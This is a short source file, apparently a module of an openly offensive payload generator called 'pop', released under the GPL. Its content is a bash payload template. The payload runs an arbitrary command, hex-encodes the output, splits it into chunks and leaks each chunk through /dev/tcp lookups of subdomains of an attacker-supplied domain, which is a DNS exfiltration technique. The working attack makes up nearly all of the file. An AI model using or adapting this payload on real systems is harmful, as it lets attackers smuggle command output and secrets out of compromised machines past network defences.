#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

USAGE = 'domain cmd [arg...]'
NARGS = [2, 0]
LANG = 'sh'
EXEC = "bash -c 'PAYLOAD'"

pl = '''
i=0;ARG2ARGN|od -vtx1 -An|(xargs -n63 printf %s;echo)|fold -w62|while read p;do </dev/tcp/$i.$p.ARG1/&i=$((i+1));done
'''
